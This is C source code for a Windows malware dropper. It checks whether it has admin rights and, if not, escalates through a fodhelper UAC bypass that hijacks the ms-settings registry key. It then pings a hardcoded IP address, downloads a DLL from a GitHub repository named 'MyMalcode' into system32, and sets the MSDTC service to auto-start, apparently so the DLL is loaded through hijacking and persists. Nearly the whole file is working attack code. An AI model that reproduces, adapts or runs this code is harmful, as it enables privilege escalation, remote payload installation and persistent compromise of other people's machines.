#include "Peb.h"

BOOL IsOnline(VOID);
DWORD PmDownloadPhantomDll(VOID);
BOOL AmIAdmin(VOID);
DWORD UACBypass(VOID);
BOOL RegDeleteEntry(HKEY hKey);
BOOL InitMsdtcService(VOID);


INT WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
{
	DWORD dwError = ERROR_SUCCESS;
	PPEB Peb = (PPEB)__readgsqword(0x60);

	if (Peb->OSMajorVersion < 6)
		goto EXIT_ROUTINE;

	if (!AmIAdmin())
	{
		if (UACBypass() != ERROR_SUCCESS)
			goto EXIT_ROUTINE;
		else
			return ERROR_SUCCESS;
	}
		
	if (!IsOnline())
		goto EXIT_ROUTINE;

	if (PmDownloadPhantomDll() != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	if (!InitMsdtcService())
		goto EXIT_ROUTINE;

	return ERROR_SUCCESS;

EXIT_ROUTINE:

	dwError = GetLastError();

	return dwError;
}

BOOL InitMsdtcService(VOID)
{
	DWORD dwError = ERROR_SUCCESS;
	SC_HANDLE hService = NULL;
	SC_HANDLE hMdtsc = NULL;
	SERVICE_STATUS_PROCESS ssStatus = { 0 };

	DWORD dwOldCheckPoint = ERROR_SUCCESS;
	DWORD dwStartTickCount = ERROR_SUCCESS;
	DWORD dwWaitTime = ERROR_SUCCESS;
	LPQUERY_SERVICE_CONFIGW lpQuery = NULL;

	DWORD dwDispose = ERROR_SUCCESS;

	hService = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASEW, SC_MANAGER_ALL_ACCESS);
	if (hService == NULL)
		goto EXIT_ROUTINE;

	hMdtsc = OpenServiceW(hService, L"MSDTC", SC_MANAGER_ALL_ACCESS);
	if (hMdtsc == NULL)
		goto EXIT_ROUTINE;

	if (!QueryServiceStatusEx(hMdtsc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssStatus, sizeof(SERVICE_STATUS_PROCESS), &dwError))
		goto EXIT_ROUTINE;

	if (ssStatus.dwCurrentState != SERVICE_STOPPED && ssStatus.dwCurrentState != SERVICE_STOP_PENDING)
		goto EXIT_ROUTINE;

	if (ssStatus.dwCurrentState == SERVICE_STOP_PENDING)
	{
		dwStartTickCount = GetTickCount();
		dwOldCheckPoint = ssStatus.dwCheckPoint;
	}

	while (ssStatus.dwCurrentState == SERVICE_STOP_PENDING)
	{
		dwWaitTime = ssStatus.dwWaitHint / 10;

		if (dwWaitTime < 1000)
			dwWaitTime = 1000;
		else
			dwWaitTime = 10000;

		Sleep(dwWaitTime);

		if (!QueryServiceStatusEx(hMdtsc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssStatus, sizeof(SERVICE_STATUS_PROCESS), &dwError))
			goto EXIT_ROUTINE;

		if (ssStatus.dwCheckPoint > dwOldCheckPoint)
		{
			dwStartTickCount = GetTickCount();
			dwOldCheckPoint = ssStatus.dwCheckPoint;
		}
		else
		{
			if (GetTickCount() - dwStartTickCount > ssStatus.dwWaitHint)
			{
				goto EXIT_ROUTINE;
			}
		}
	}

	dwError = ERROR_SUCCESS;
	QueryServiceConfigW(hMdtsc, NULL, 0, &dwError);

	lpQuery = (LPQUERY_SERVICE_CONFIGW)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwError);
	if (lpQuery == NULL)
		goto EXIT_ROUTINE;

	dwDispose = dwError;

	if (!QueryServiceConfigW(hMdtsc, lpQuery, dwDispose, &dwError))
		goto EXIT_ROUTINE;

	if (lpQuery->dwStartType != SERVICE_AUTO_START)
	{
		if (!ChangeServiceConfigW(hMdtsc, 
								  SERVICE_NO_CHANGE, 
								  SERVICE_AUTO_START, 
								  SERVICE_NO_CHANGE,
								  NULL, 
								  NULL, 
								  NULL, 
								  NULL,
								  NULL, 
								  NULL, 
								  NULL))
		{
			goto EXIT_ROUTINE;
		}

		if (!StartServiceW(hMdtsc, 0, NULL))
			goto EXIT_ROUTINE;

		dwError = ERROR_SUCCESS;
		if (!QueryServiceStatusEx(hMdtsc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssStatus, sizeof(SERVICE_STATUS_PROCESS), &dwError))
			goto EXIT_ROUTINE;

		dwStartTickCount = GetTickCount();
		dwOldCheckPoint = ssStatus.dwCheckPoint;

		while (ssStatus.dwCurrentState == SERVICE_START_PENDING)
		{
			dwWaitTime = ssStatus.dwWaitHint / 10;
			if (dwWaitTime < 1000)
				dwWaitTime = 1000;
			else
			{
				if (dwWaitTime > 10000)
					dwWaitTime = 10000;
			}

			Sleep(dwWaitTime);

			if (!QueryServiceStatusEx(hMdtsc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssStatus, sizeof(SERVICE_STATUS_PROCESS), &dwError))
				goto EXIT_ROUTINE;

			if (ssStatus.dwCheckPoint > dwOldCheckPoint)
			{
				dwStartTickCount = GetTickCount();
				dwOldCheckPoint = ssStatus.dwCheckPoint;
			}
			else
			{
				if (GetTickCount() - dwStartTickCount > ssStatus.dwWaitHint)
				{
					break;
				}
			}
		}

	}

	if (lpQuery)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, lpQuery);

	if (hMdtsc)
		CloseServiceHandle(hMdtsc);

	if (hService)
		CloseServiceHandle(hService);


	return TRUE;

EXIT_ROUTINE:

	dwError = GetLastError();

	if (lpQuery)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, lpQuery);

	if (hMdtsc)
		CloseServiceHandle(hMdtsc);

	if (hService)
		CloseServiceHandle(hService);

	SetLastError(dwError);

	return FALSE;
}

BOOL RegDeleteEntry(HKEY hKey)
{
	if (RegDeleteKeyExW(hKey, L"SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\\", KEY_WOW64_64KEY, 0) != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	if (RegDeleteKeyExW(hKey, L"SOFTWARE\\Classes\\ms-settings\\shell\\open\\", KEY_WOW64_64KEY, 0) != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	if (RegDeleteKeyExW(hKey, L"SOFTWARE\\Classes\\ms-settings\\shell\\", KEY_WOW64_64KEY, 0) != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	if (RegDeleteKeyExW(hKey, L"SOFTWARE\\Classes\\ms-settings\\", KEY_WOW64_64KEY, 0) != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	return TRUE;

EXIT_ROUTINE:

	return FALSE;
}

DWORD UACBypass(VOID)
{
	HKEY hKey = HKEY_CURRENT_USER;
	HKEY hkResult;
	WCHAR pvData[WCHAR_MAXPATH] = { 0 };
	WCHAR lpData[WCHAR_MAXPATH] = { 0 };
	WCHAR lpApplicationName[WCHAR_MAXPATH] = L"C:\\Windows\\System32\\cmd.exe /k C:\\Windows\\System32\\Fodhelper.exe";
	WCHAR lpDelegateString[WCHAR_MAXPATH] = L"DelegateExecute";
	DWORD pchData = 0;
	DWORD dwGetValue = 0;
	DWORD dwSetValue = 0;
	PROCESS_INFORMATION Pi = { 0 };
	STARTUPINFOW Si = { 0 };
	Si.cb = sizeof(STARTUPINFOW);

	if (RegCreateKeyEx(hKey, L"SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\\", 0, NULL,
		REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkResult, NULL) != ERROR_SUCCESS)
	{
		goto EXIT_ROUTINE;
	}

	if (GetModuleFileNameW(NULL, lpData, WCHAR_MAXPATH) == 0)
		goto EXIT_ROUTINE;

	if (RegSetKeyValueW(hkResult, NULL, NULL, REG_SZ, lpData, (DWORD)wcslen(lpData) * (DWORD)sizeof(WCHAR)) != ERROR_SUCCESS)
		goto EXIT_ROUTINE;

	dwGetValue = RegGetValueW(hkResult, NULL, lpDelegateString, RRF_RT_REG_SZ, NULL, pvData, &pchData);

	if (dwGetValue == 2)
	{
		if (RegSetKeyValueW(hkResult, NULL, lpDelegateString, REG_SZ, NULL, 0) != ERROR_SUCCESS)
			goto EXIT_ROUTINE;
	}

	if (!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe",
						lpApplicationName,
						NULL,
						NULL,
						FALSE,
						CREATE_NEW_CONSOLE | NORMAL_PRIORITY_CLASS,
						NULL,
						NULL,
						&Si,
						&Pi))
	{
		goto EXIT_ROUTINE;
	}
		

	Sleep(5000);

	if (!RegDeleteEntry(hKey))
		goto EXIT_ROUTINE;

	if (hkResult)
		RegCloseKey(hkResult);

	if (hKey)
		RegCloseKey(hKey);

	if (Pi.hProcess)
		CloseHandle(Pi.hProcess);

	if (Pi.hThread)
		CloseHandle(Pi.hThread);

	return ERROR_SUCCESS;

EXIT_ROUTINE:

	DWORD dwError = GetLastError();

	if (hkResult)
		RegCloseKey(hkResult);

	if (hKey)
		RegCloseKey(hKey);

	if (Pi.hProcess)
		CloseHandle(Pi.hProcess);

	if (Pi.hThread)
		CloseHandle(Pi.hThread);

	return dwError;
}

BOOL AmIAdmin(VOID)
{
	BOOL AmIAdmin = FALSE;
	HANDLE HToken = NULL;
	TOKEN_ELEVATION Elevation = { 0 };
	DWORD dwSize;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &HToken))
		goto EXIT_ROUTINE;

	if (!GetTokenInformation(HToken, TokenElevation, &Elevation, sizeof(Elevation), &dwSize))
		goto EXIT_ROUTINE;

	AmIAdmin = Elevation.TokenIsElevated;

EXIT_ROUTINE:

	if (HToken)
	{
		CloseHandle(HToken);
		HToken = NULL;
	}
	return AmIAdmin;
}

DWORD PmDownloadPhantomDll(VOID)
{
	DWORD dwError = ERROR_SUCCESS;
	HINTERNET hInternetOpen = NULL;
	HINTERNET hInternetConnect = NULL;
	WCHAR wLegacyAgent[MAX_PATH] = L"Mozilla/4.0 (compatible; MSIE 8.0; Win32)";
	BYTE tBuffer[4096] = { 0 };
	WCHAR FileCreationPath[MAX_PATH] = { 0 };
	HANDLE hHandle = INVALID_HANDLE_VALUE;

	DWORD dwBytesRead = 1;

	hInternetOpen = InternetOpenW(wLegacyAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternetOpen == NULL)
		goto EXIT_ROUTINE;

	hInternetConnect = InternetOpenUrlW(hInternetOpen, L"https://github.com/smellyvx/MyMalcode/raw/main/oci.dll", 
										NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION, 0);
	if (hInternetConnect == NULL)
		goto EXIT_ROUTINE;

	if (GetEnvironmentVariableW(L"SYSTEMROOT", FileCreationPath, MAX_PATH) == 0)
		goto EXIT_ROUTINE;
	else
		wcscat(FileCreationPath, L"\\system32\\oci.dll");

	hHandle = CreateFile(FileCreationPath, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
		goto EXIT_ROUTINE;

	for (; dwBytesRead > 0;)
	{
		DWORD dwTemp = 0;
		ZeroMemory(tBuffer, 4096);

		if (!InternetReadFile(hInternetConnect, tBuffer, 4096, &dwBytesRead))
			goto EXIT_ROUTINE;

		if (!WriteFile(hHandle, tBuffer, dwBytesRead, &dwTemp, NULL))
			goto EXIT_ROUTINE;
	}
	
	if (hHandle)
		CloseHandle(hHandle);

	if (hInternetConnect)
		InternetCloseHandle(hInternetConnect);

	if (hInternetOpen)
		InternetCloseHandle(hInternetOpen);

	return ERROR_SUCCESS;


EXIT_ROUTINE:

	dwError = GetLastError();

	if (hHandle)
		CloseHandle(hHandle);
	
	if (hInternetConnect)
		InternetCloseHandle(hInternetConnect);

	if (hInternetOpen)
		InternetCloseHandle(hInternetOpen);

	return dwError;
}

BOOL IsOnline(VOID)
{
	DWORD dwError = ERROR_SUCCESS;
	HMODULE hLibrary = NULL;
	ICMPSENDECHO IcmpSendEcho = NULL;
	ICMPCREATEFILE IcmpCreateFile = NULL;
	ICMPCLOSEHANDLE IcmpCloseHandle = NULL;
	RTLIPV4ADDRESSTOSTRINGW RtlIpv4AddressToStringW = NULL;
	ULONG uIpAddress = INADDR_NONE;
	HANDLE hHandle = INVALID_HANDLE_VALUE;
	HMODULE hNtdllMod = NULL;

	CHAR SendData[16] = "ICMP_REQ";
	DWORD dwReplySize = ERROR_SUCCESS;
	LPVOID lpReplyBuffer = NULL;

	WCHAR wAddress[32] = { 0 };

	hLibrary = LoadLibraryW(L"Iphlpapi.dll");
	if (hLibrary == NULL)
		goto EXIT_ROUTINE;

	hNtdllMod = GetModuleHandle(L"ntdll.dll");
	if (hNtdllMod == NULL)
		goto EXIT_ROUTINE;

	IcmpSendEcho = (ICMPSENDECHO)GetProcAddress(hLibrary, "IcmpSendEcho");
	IcmpCreateFile = (ICMPCREATEFILE)GetProcAddress(hLibrary, "IcmpCreateFile");
	IcmpCloseHandle = (ICMPCLOSEHANDLE)GetProcAddress(hLibrary, "IcmpCloseHandle");
	RtlIpv4AddressToStringW = (RTLIPV4ADDRESSTOSTRINGW)GetProcAddress(hNtdllMod, "RtlIpv4AddressToStringW");

	if (!IcmpCreateFile || !IcmpSendEcho || !IcmpCloseHandle || !RtlIpv4AddressToStringW)
		goto EXIT_ROUTINE;

	uIpAddress = inet_addr("173.208.211.68");
	if (uIpAddress == INADDR_NONE)
		goto EXIT_ROUTINE;

	hHandle = IcmpCreateFile();
	if (hHandle == INVALID_HANDLE_VALUE)
		goto EXIT_ROUTINE;

	dwReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
	lpReplyBuffer = (LPVOID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)dwReplySize);
	if (lpReplyBuffer == NULL)
		goto EXIT_ROUTINE;

	dwError = IcmpSendEcho(hHandle, uIpAddress, SendData, sizeof(SendData), NULL, lpReplyBuffer, dwReplySize, 1000);
	if (dwError != 0)
	{
		PICMP_ECHO_REPLY pEchoReply = (PICMP_ECHO_REPLY)lpReplyBuffer;
		struct in_addr ReplyAddr = { 0 };

		ReplyAddr.S_un.S_addr = pEchoReply->Address;

		RtlIpv4AddressToStringW(&ReplyAddr, wAddress);
	}
	else
		goto EXIT_ROUTINE;

	if (wcscmp(L"173.208.211.68", wAddress) != 0)
		goto EXIT_ROUTINE;

	if (lpReplyBuffer)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, lpReplyBuffer);

	if (hHandle)
		IcmpCloseHandle(hHandle);

	if (hLibrary)
		FreeLibrary(hLibrary);

	return TRUE;

EXIT_ROUTINE:

	dwError = GetLastError();

	if (lpReplyBuffer)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, lpReplyBuffer);

	if (hHandle)
		IcmpCloseHandle(hHandle);

	if (hLibrary)
		FreeLibrary(hLibrary);

	SetLastError(dwError);

	return FALSE;
}
